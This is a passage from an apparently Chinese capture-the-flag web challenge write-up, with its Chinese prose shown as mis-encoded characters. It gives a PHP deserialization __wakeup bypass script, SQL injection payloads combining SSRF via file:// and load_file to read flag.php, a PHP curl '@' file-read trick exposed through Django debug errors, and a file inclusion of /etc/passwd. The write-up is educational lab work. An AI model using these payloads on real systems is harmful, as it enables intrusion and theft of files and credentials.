class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Demo(<span class="string">&quot;fl4g.php&quot;</span>);</span><br><span class="line"><span class="variable">$se</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$se</span> = str_replace(<span class="string">&quot;O:4&quot;</span>, <span class="string">&quot;O:+4&quot;</span>, <span class="variable">$se</span>);</span><br><span class="line"><span class="variable">$se</span> = str_replace(<span class="string">&#x27;&quot;Demo&quot;:1&#x27;</span>, <span class="string">&#x27;&quot;Demo&quot;:2&#x27;</span>, <span class="variable">$se</span>);</span><br><span class="line"><span class="keyword">print</span>(base64_encode(<span class="variable">$se</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></code></pre><p>GETä¼ é€’base64ç¼–ç ç»“æœï¼Œå¾—åˆ°flag<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569811.png" alt="1602427435111.png"></p><p>ä¹Ÿå¯ä»¥åœ¨çº¿ç¼–ç ï¼Œä½†æ˜¯æ³¨æ„éœ€è¦åœ¨Demoå·¦å³æ·»åŠ \00ï¼Œå› ä¸ºç§æœ‰å±æ€§privateåœ¨åºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨æ·»åŠ ç±»ååŠ\00ä¸å¯æ‰“å°ç¬¦å·ï¼Œä½†æ˜¯æŸ¥çœ‹æºç æ˜¯å¯ä»¥å‘ç°çš„ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569824.png" alt="1602430789230.png"></p><p>æ‰€ä»¥åœ¨æ‰‹åŠ¨ä¿®æ”¹æ•°æ®å¹¶base64æ—¶ï¼Œéœ€è¦æ·»åŠ \00<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569832.png" alt="1602430889005.png"></p><h2 id="â­-fakebookï¼ˆSSRF-SQLæ³¨å…¥ï¼‰"><a href="#â­-fakebookï¼ˆSSRF-SQLæ³¨å…¥ï¼‰" class="headerlink" title="â­ fakebookï¼ˆSSRF+SQLæ³¨å…¥ï¼‰"></a>â­ fakebookï¼ˆSSRF+SQLæ³¨å…¥ï¼‰</h2><p>4æ˜Ÿéš¾åº¦çš„é¢˜ç›®ï¼Œä»è¿™é“é¢˜å¼€å§‹æ˜æ˜¾æ„Ÿè§‰åˆ°æœ‰äº›åƒåŠ›ï¼Œèƒ½åšå‡ºæ¥å¾—ç›Šäºå¸ˆå‚…ä»¬çš„wpæ–‡ç« ã€‚</p><p>é¦–å…ˆæ‰«æç½‘ç«™ç›®å½•ï¼Œå‘ç°å­˜åœ¨flag.phpæ–‡ä»¶ï¼Œåœ¨robots.txtä¸­å‘ç°äº†user.php.bakæ–‡ä»¶ï¼Œè®¿é—®è¯¥æ–‡ä»¶ä¿å­˜è‡³æœ¬åœ°ï¼Œæ˜¯phpæºç ï¼Œè¿›è¡Œä»£ç å®¡è®¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å®¡è®¡å‘ç°ï¼Œåœ¨getå‡½æ•°ä¸­ï¼Œç¬¬23è¡Œæ²¡æœ‰å¯¹ä¼ å…¥çš„urlï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·æŒ‡å®šçš„è‡ªå·±çš„Blogåœ°å€åšå®‰å…¨æ ¡éªŒï¼Œå¯¼è‡´æ­¤å¤„å¯èƒ½<strong>å­˜åœ¨SSRFæ¼æ´</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨isValidBlogå‡½æ•°ä¸­ï¼Œç¬¬41è¡Œå¯¹blogåšäº†æ­£åˆ™åŒ¹é…ï¼Œå¿…é¡»è¾“å…¥ç½‘å€æ ¼å¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br></pre></td></tr></table></figure><p>å·²çŸ¥å¯èƒ½å­˜åœ¨SSRFï¼Œåˆæœ‰**isValidBlog()**å‡½æ•°è¿‡æ»¤ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯åœ¨è¾“å…¥çš„æ—¶å€™è¿‡æ»¤è¿˜æ˜¯æŸ¥è¯¢çš„æ—¶å€™åŒæ ·è¿‡æ»¤ï¼Œå¦‚æœæ˜¯åªåœ¨è¾“å…¥çš„æ—¶å€™è¿‡æ»¤ï¼Œé‚£ä¹ˆåªéœ€è¦æƒ³åŠæ³•å°†SSRFåˆ©ç”¨ä»£ç ä¼ å…¥æ•°æ®åº“ï¼ŒæŸ¥è¯¢å³å¯ï¼›å¦‚æœæ˜¯æŸ¥è¯¢å‰è¿‡æ»¤ï¼Œé‚£å°±å¾—å¦å¯»ä»–æ³•äº†ã€‚</p><p>ç»§ç»­å¾€ä¸‹ï¼Œåœ¨æ³¨å†Œç”¨æˆ·å’ŒæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯å‚æ•°å¤„éƒ½å­˜åœ¨SQLæ—¶é—´ç›²æ³¨ï¼Œè€Œä¸”é¡µé¢æŠ¥é”™ä¹Ÿçˆ†å‡ºäº†ç½‘ç«™æ ¹ç›®å½•<code>/var/www/html/</code>ç›´æ¥SQLmapè·‘è¡¨</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386702.png" alt="1604157974568.png"></p><p>è·‘fakebookåº“çš„å†…å®¹ï¼Œå‘ç°å­˜å‚¨çš„æ˜¯æ³¨å†Œç”¨æˆ·çš„ä¸ªäººä¿¡æ¯åºåˆ—åŒ–ç»“æœ</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386709.png" alt="1604158158876.png"></p><p>å°è¯•åˆ©ç”¨SQLmapæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¤±è´¥äº†ï¼Œè¿™å°±æœ‰å¦å¤–ä¸€ä¸ªå¯èƒ½çš„åˆ©ç”¨æ–¹å¼äº†ï¼Œå·²çŸ¥ä¿¡æ¯å¦‚ä¸‹ï¼š</p><ul><li>å­˜åœ¨SSRFï¼Œå¯èƒ½ä»…åœ¨æ³¨å†Œæ—¶æ£€æŸ¥Blog URLçš„åˆæ³•æ€§</li><li>å­˜åœ¨SQLæ³¨å…¥</li><li>å·²çŸ¥ç½‘ç«™æ ¹ç›®å½•å’Œflag.phpä½ç½®</li><li>æ•°æ®åº“å­˜å‚¨çš„æ˜¯ä¸ªäººä¿¡æ¯çš„åºåˆ—åŒ–ç»“æœ</li></ul><p>åˆ©ç”¨è¿™äº›ï¼Œå¯ä»¥å°è¯•åœ¨æŸ¥è¯¢ç”¨æˆ·æ•°æ®ä¿¡æ¯æ—¶ï¼Œå°†ç”¨æˆ·çš„Blog URLæ”¹ä¸ºfileåè®®è¯»å–<strong>flag.php</strong>æ–‡ä»¶çš„SSRFåˆ©ç”¨ä»£ç ï¼Œæ„é€ åºåˆ—åŒ–ç»“æœå¹¶é€šè¿‡SQLæ³¨å…¥æ¥å®ŒæˆæŸ¥è¯¢ï¼Œå³å¯å¾—åˆ°Flagï¼ˆå½“ç„¶è¿™ä¹Ÿæ˜¯è¯»å¸ˆå‚…ä»¬æ–‡ç« å¾—åˆ°çš„å¯å‘~ï¼‰</p><p>é€šè¿‡å¯¹å‚æ•°nçš„SQLæ³¨å…¥æµ‹è¯•ï¼Œå¾—åˆ°æœ‰4ä¸ªå­—æ®µï¼Œç”¨æˆ·blogæ•°æ®åœ¨ç¬¬å››ä¸ªå­—æ®µï¼Œè€Œä¸”ç¨‹åºå¯¹<code>union select</code>æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨æ³¨é‡Š<code>/**/</code>æ›¿æ¢ç©ºæ ¼çš„æ–¹å¼ç»•è¿‡</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œ</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386731.png" alt="1604161297056.png"></p><p>æŸ¥çœ‹é¡µé¢æºç å·²ç»è¯»å‡ºflag.phpæ–‡ä»¶å†…å®¹ï¼Œåªä¸è¿‡åšäº†base64ç¼–ç åæ”¾åœ¨äº†iframeæ ‡ç­¾ä¸­</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386745.png" alt="1604161517371.png"></p><p>å¯¹è¿™ä¸²base64è§£ç åŒæ ·æ˜¯å°±æ˜¯flag.phpæ–‡ä»¶çš„å†…å®¹</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386755.png" alt="1604161465705.png"></p><p>çœ‹äº†å¸ˆå‚…ä»¬çš„wpï¼Œå¾—çŸ¥è¿˜æœ‰å¦ä¸€ç§æ›´ä¸ºç®€å•çš„ï¼Œä½†å…¶å®é“ç†æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨SQLæ³¨å…¥ï¼Œè¯»å–/var/www/html/flag.phpæ–‡ä»¶ï¼Œåªä¸è¿‡æ­¤æ–¹æ³•æ˜¯å°†æ•°æ®å›æ˜¾æ”¾åœ¨äº†å…¶ä»–å­—æ®µï¼Œæ¯”å¦‚å§“åè¥¿æ®µï¼Œå°±ä¸éœ€è¦åšåºåˆ—åŒ–äº†</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),3,4</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒåæŸ¥çœ‹æºç å³å¯å¾—åˆ°Flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386764.png" alt="1604162503775.png"></p><h3 id="æ€»ç»“ä¸€ä¸‹"><a href="#æ€»ç»“ä¸€ä¸‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a><strong>æ€»ç»“ä¸€ä¸‹</strong></h3><p>æ¼æ´ç‚¹ï¼šSSRFã€SQLæ³¨å…¥ã€æŠ¥é”™ä¿¡æ¯æ³„éœ²æ ¹ç›®å½•ï¼ŒWebæ‰«æå¾—åˆ°å…³é”®è·¯å¾„</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><strong>å‚è€ƒ</strong></h3><p><a href="https://blog.csdn.net/qq_42196196/article/details/81952174">https://blog.csdn.net/qq_42196196/article/details/81952174</a></p><p><a href="http://www.mamicode.com/info-detail-2893815.html">http://www.mamicode.com/info-detail-2893815.html</a></p><h2 id="â­-catï¼ˆDjangoå®½å­—èŠ‚æŠ¥é”™-php-curl-è¯»å–æ–‡ä»¶ï¼‰"><a href="#â­-catï¼ˆDjangoå®½å­—èŠ‚æŠ¥é”™-php-curl-è¯»å–æ–‡ä»¶ï¼‰" class="headerlink" title="â­ catï¼ˆDjangoå®½å­—èŠ‚æŠ¥é”™+php curl @è¯»å–æ–‡ä»¶ï¼‰"></a>â­ catï¼ˆDjangoå®½å­—èŠ‚æŠ¥é”™+php curl @è¯»å–æ–‡ä»¶ï¼‰</h2><p>å¾ˆéš¾ï¼Œå‡ ä¹å®Œå…¨å‚è€ƒå¸ˆå‚…ä»¬çš„wpåšå®Œçš„ï¼Œå¤§ä½¬çš„æ€è·¯çœŸçš„é‡ï¼ğŸ˜…</p><p>ä¸€ä¸ªpingåŠŸèƒ½çš„ç³»ç»Ÿï¼Œå°è¯•ç®¡é“ç¬¦å‘½ä»¤æ‰§è¡Œå‘ç°è¢«è¿‡æ»¤ï¼ŒFUZZæµ‹è¯•ï¼Œå‘ç°urlè¿‡æ»¤å¤„çš„æ²¡æœ‰å¯¹ä»¥ä¸‹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387393.png" alt="1604207185171.png"></p><p>æµ‹è¯•å‘ç°åå°ä½¿ç”¨çš„æ˜¯GBKå®½å­—ç¬¦ç¼–ç ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹urlå‚æ•°å€¼ä¸ºå®½å­—ç¬¦**%df**åˆ¶é€ æŠ¥é”™ï¼Œå‘ç°åç«¯æ˜¯ç”¨Pythonçš„Djangoæ¡†æ¶å†™çš„</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387401.png" alt="1604204281681 (1).png"></p><p>è€Œä¸”æ‰¾åˆ°äº†pingå‡½æ•°çš„å†…å®¹ï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387409.png" alt="1604204491772 (1).png"></p><p>æŠŠä»£ç æ‹·åˆ°æœ¬åœ°ï¼Œæ•´ç†ä¸€ä¸‹ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•çš„é€»è¾‘ï¼Œç”šè‡³ä¸éœ€è¦æ‹·åˆ°æœ¬åœ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@process_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span>(<span class="params">request</span>):</span></span><br><span class="line"><span class="comment"># è½¬ä¹‰</span></span><br><span class="line">data = request.POST.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">data = escape(data)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">&#x27;^[a-zA-Z0-9\-\./]+$&#x27;</span>, data):</span><br><span class="line"><span class="keyword">return</span> HttpResponse(<span class="string">&quot;Invalid URL&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> HttpResponse(os.popen(<span class="string">&quot;ping -c 1 \&quot;%s\&quot;&quot;</span> % data).read())</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ<code>escape()</code>å‡½æ•°å¯¹è¾“å…¥ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œç„¶åå°†è½¬ä¹‰ç»“æœæ”¾åœ¨<code>re.match()</code>ä¸­è¿›è¡ŒåŒ¹é…è¿‡æ»¤ï¼ŒåŒ¹é…ç½‘å€æˆ–ipçš„æ•°æ®æ ¼å¼ï¼Œæœ€åä½¿ç”¨<code>os.popen()</code>æ‰§è¡Œpingå‘½ä»¤ï¼Œå¾—åˆ°å¹¶è¿”å›ç»“æœã€‚</p><p>æ ¹æ®å¸ˆå‚…ä»¬çš„æ–‡ç« å¾—çŸ¥ï¼ŒåŸé¢˜ç›®åœ¨æ¯”èµ›ä¸­æ˜¯æœ‰æç¤ºçš„ï¼ˆ <code>RTFM of PHP CURL===&gt;&gt;read the fuck manul of PHP CURL???</code> ï¼‰ï¼Œæ‰€ä»¥æ­¤å¤„éœ€è¦åˆ©ç”¨PHP curlä¸­çš„@æ¥è¯»å–æ–‡ä»¶ï¼ŒæŸ¥æ‰¾PHPæ‰‹å†Œå¾—åˆ°äº†ä¸€äº›ä¿¡æ¯ï¼š<a href="https://www.php.net/manual/zh/class.curlfile.php">https://www.php.net/manual/zh/class.curlfile.php</a></p><blockquote><p>There are â€œ@â€ issue on multipart POST requests.</p><p>Solution for PHP 5.5 or later:</p><ul><li>Enable CURLOPT_SAFE_UPLOAD.</li><li>Use CURLFile instead of â€œ@â€.</li></ul><p>Solution for PHP 5.4 or earlier:</p><ul><li>Build up multipart content body by youself.</li><li>Change â€œContent-Typeâ€ header by yourself.</li></ul></blockquote><p>æ‰‹å†Œæ€»çš„å¤§è‡´æ„æ€æ˜¯åœ¨php5.5ä¹‹åå°±åºŸå¼ƒäº†POSTè¯·æ±‚ä¸­<code>@+æ–‡ä»¶è·¯å¾„</code>çš„ä¸Šä¼ æ–‡ä»¶æ–¹æ³•ã€‚åœ¨å¤–ç½‘æ‰¾åˆ°äº†ä¸€ä¸ªç›¸å…³ä½¿ç”¨ç¤ºä¾‹ï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387427.png" alt="1604209282439(1).png"></p><p>åˆ©ç”¨æ­¤å‰çš„é¡µé¢æŠ¥é”™å¾—åˆ°çš„Djangoé¡¹ç›®è·¯å¾„ï¼Œä»¥åŠåœ¨æŠ¥é”™é¡µé¢æœç´¢å¾—åˆ°çš„database.sqlite3æ•°æ®åº“æ–‡ä»¶ï¼Œå°è¯•è¯»å–è¯¥æ•°æ®åº“æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@&#x2F;opt&#x2F;api&#x2F;database.sqlite3</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387435.png" alt="1604214520408 (1).png"></p><p>é¡µé¢æœç´¢CTFï¼Œå¾—åˆ°Flagï¼š<code>AWHCTF&#123;yoooo_Such_A_G00D_@&#125;</code></p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆæ­¤å¤„èƒ½å¤Ÿè¯»å–åˆ°æ–‡ä»¶ï¼Œæ­£å¸¸ç¨‹åºPOSTè¯·æ±‚å’ŒFILEè¯·æ±‚æ˜¯åˆ†å¼€çš„ï¼Œä½†æ˜¯é¢˜ç›®ä¸­å°†FILEè¯·æ±‚å’ŒPOSTè¯·æ±‚åˆå¹¶åˆ°äº†ä¸€å—ï¼š</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387447.png" alt="1604216002158.png"></p><p>åŒæ—¶åˆå°†<strong>CONTENT_TYPE</strong>è®¾å®šä¸ºå¥‡æ€ªçš„<code>multipart/form-data</code></p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387456.png" alt="1604216203986.png"></p><p>è€ŒPHPçš„curlä¸­@ä¸Šä¼ æ–‡ä»¶æ­£å¥½æ˜¯åœ¨éœ€è¦ <code>multipart/form-data</code> æ‰€ä»¥çŒœæµ‹åå°çš„<strong>ç¨‹åºé€»è¾‘</strong>æ˜¯ï¼š</p><ul><li>PHPæ¥æ”¶GETå‚æ•°ï¼Œä½¿ç”¨POSTæ–¹å¼ä¼ é€’ç»™åå°Djangoæ­å»ºçš„api</li><li>Djangoå¯¹PHPä¼ è¿›æ¥çš„POSTæ•°æ®åšGBKç¼–ç </li><li>GBKç¼–ç åå†æ‰§è¡ŒDjangoä¸­çš„pingæ“ä½œ</li></ul><p>æ‰€ä»¥èƒ½å¤Ÿåˆ©ç”¨å¹¶<strong>è¯»å–æ–‡ä»¶çš„åŸç†</strong>æ˜¯ï¼š</p><ul><li>åˆ©ç”¨PHPçš„curl @è¯»å–æ–‡ä»¶åï¼ŒPOSTä¼ é€’ç»™Djangoåšç¼–ç å¤„ç†</li><li>Djangoä¸­GBKç¼–ç æ— æ³•å¯¹POSTä¼ é€’çš„æ–‡ä»¶å†…å®¹ä¸­è¶…è¿‡%7Fçš„å­—ç¬¦åšç¼–è§£ç å¤„ç†å°±ä¼šæŠ¥é”™ï¼Œæ¯”å¦‚<code>\xe6</code></li><li>Djangoå¼€å¯äº†debugï¼Œæ‰€ä»¥ä¼šå°†POSTæ•°æ®ä½œä¸ºæŠ¥é”™è¾“å‡ºåˆ°é¡µé¢</li></ul><p>ä¹Ÿæ˜¯å‚è€ƒå¸ˆå‚…ä»¬å­¦ä¹ çš„ï¼Œè·¯å­å¤ªé‡äº†~</p><h3 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.wupco.cn/?p=4195">http://www.wupco.cn/?p=4195</a></p><p><a href="https://www.php.net/manual/zh/function.curl-setopt.php">https://www.php.net/manual/zh/function.curl-setopt.php</a></p><p><a href="https://www.dazhuanlan.com/2019/12/30/5e0957fc025dc/">https://www.dazhuanlan.com/2019/12/30/5e0957fc025dc/</a></p><p><a href="https://www.php.net/manual/zh/class.curlfile.php">https://www.php.net/manual/zh/class.curlfile.php</a></p><p><a href="https://www.cnblogs.com/Jleixin/p/13024972.html">https://www.cnblogs.com/Jleixin/p/13024972.html</a></p><p><a href="http://code.iamkate.com/php/sending-files-using-curl/">http://code.iamkate.com/php/sending-files-using-curl/</a></p><h2 id="â­-ics-05ï¼ˆæ–‡ä»¶åŒ…å«-php-filteræœ¬åœ°è¯»å–-preg-replace-å‘½ä»¤æ‰§è¡Œï¼‰"><a href="#â­-ics-05ï¼ˆæ–‡ä»¶åŒ…å«-php-filteræœ¬åœ°è¯»å–-preg-replace-å‘½ä»¤æ‰§è¡Œï¼‰" class="headerlink" title="â­ ics-05ï¼ˆæ–‡ä»¶åŒ…å«+php://filteræœ¬åœ°è¯»å–+preg_replace()å‘½ä»¤æ‰§è¡Œï¼‰"></a>â­ ics-05ï¼ˆæ–‡ä»¶åŒ…å«+php://filteræœ¬åœ°è¯»å–+preg_replace()å‘½ä»¤æ‰§è¡Œï¼‰</h2><p>é¢˜ç›®æè¿°ï¼š å…¶ä»–ç ´åè€…ä¼šåˆ©ç”¨å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒçš„åé—¨å…¥ä¾µç³»ç»Ÿï¼Œæ‰€ä»¥ç›´æ¥è¿›ä¹ é€šçš„ç»´æŠ¤ä¸­å¿ƒæ¿å—ï¼Œä½†æ˜¯å‘ç°é¡µé¢æ˜¯æ¥å£è¯·æ±‚å¼‚å¸¸</p><p>ç‚¹å‡»åšä¸Šè¾¹çš„æ ‡é¢˜ï¼Œå‘ç°urlä¸­pageå‚æ•°åŒ…å«äº†indexé¡µé¢ï¼Œè€ƒè™‘æ˜¯å¦å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393476.png" alt="1604245119902 (1).png"></p><p>å°†pageå‚æ•°æ”¹ä¸º<code>/etc/passwd</code>æˆåŠŸåŒ…å«ï¼Œçš„ç¡®å­˜åœ¨ï¼Œä½†æ˜¯å°è¯•å…¶ä»–æ–‡ä»¶åˆæ²¡æœ‰ååº”ï¼Œè€Œä¸”å½“è¾“å…¥çš„æ˜¯å­—ç¬¦ä¸²æ—¶ï¼Œä¼šç›´æ¥è¾“å‡ºè¯¥å­—ç¬¦ä¸²ï¼Œä¸å¤ªç†è§£â€¦â€¦</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393505.png" alt="1604245312186 